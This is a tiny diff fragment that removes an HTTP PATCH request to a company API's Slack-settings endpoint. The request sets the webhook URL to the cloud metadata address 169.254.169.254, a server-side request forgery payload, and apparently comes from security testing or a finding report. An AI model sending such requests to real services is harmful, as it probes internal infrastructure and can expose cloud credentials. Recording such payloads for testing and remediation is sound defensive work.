@@ -1,3 +1,0 @@
-PATCH https://api.valensjewelry.com/api/users/me/slack-settings
-Authorization: Bearer <REDACTED_TENANTB_TOKEN>
-{"slack_webhook_url":"http://169.254.169.254/latest/meta-data/","slack_digest_enabled":true}
